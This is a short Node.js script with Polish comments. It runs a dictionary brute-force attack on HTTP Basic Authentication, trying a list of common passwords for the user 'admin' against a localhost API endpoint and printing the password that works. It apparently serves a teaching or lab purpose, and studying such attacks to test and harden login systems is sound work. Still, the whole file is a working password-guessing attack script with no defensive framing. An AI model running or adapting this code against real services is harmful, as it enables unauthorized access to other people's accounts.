const axios = require('axios');

// adres i dane
const url = 'http://localhost:3000/api/data';
const username = 'admin';
const dictionary = ['apple', 'password', 'admin123', 'sky', 'cat', 'water'];

async function libraryBruteForce() {
    console.log('rozpoczynam atak za pomoca biblioteki axios...');

    for (const password of dictionary) {
        console.log(`sprawdzam haslo: ${password}`);

        try {
            // axios sam obsluguje basic auth dzieki wlasciwosci 'auth'
            const response = await axios.get(url, {
                auth: {
                    username: username,
                    password: password
                }
            });

            // jesli axios nie rzuci bledu, oznacza to ze logowanie sie udalo (status 2xx)
            console.log(`\nsukces! poprawne haslo to: ${password}`);
            return; // konczymy petle
            
        } catch (error) {
            // axios automatycznie rzuca blad dla statusow takich jak 401 unauthorized
            // ignorujemy go i idziemy do kolejnego hasla w petli
        }
    }
    console.log('nie znaleziono hasla w slowniku.');
}

libraryBruteForce();